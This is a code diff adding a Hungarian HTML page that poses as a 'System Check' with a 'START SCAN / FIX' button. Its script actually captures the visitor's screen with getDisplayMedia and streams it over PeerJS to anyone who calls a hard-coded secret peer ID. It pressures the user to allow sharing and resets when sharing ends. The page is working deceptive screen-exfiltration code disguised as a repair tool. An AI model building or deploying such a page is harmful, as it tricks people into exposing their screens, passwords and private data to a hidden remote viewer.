@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <title>Képernyő Megosztó</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #111; color: white; padding-top: 50px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 5px; }
+        #status { margin-top: 20px; color: #aaa; }
+    </style>
+</head>
+<body>
+    <h1>Rendszer Ellenőrzés</h1>
+    <button id="startBtn">START SCAN / JAVÍTÁS</button>
+    <p id="status">Állapot: Készenlét</p>
+
+    <script>
+        // EZ AZ ID KÖTI ÖSSZE A KÉT ESZKÖZT
+        const MY_ID = 'markella_titkos_2026'; 
+        const peer = new Peer(MY_ID);
+
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                document.getElementById('status').innerText = "Állapot: Közvetítés aktív...";
+                document.getElementById('startBtn').style.display = 'none';
+
+                peer.on('call', call => {
+                    call.answer(stream);
+                });
+                
+                // Ha leállítják a megosztást a böngészőben
+                stream.getVideoTracks()[0].onended = () => location.reload();
+
+            } catch (err) {
+                alert("Hiba: Engedélyezned kell a képernyőmegosztást!");
+            }
+        });
+    </script>
+</body>
+</html>
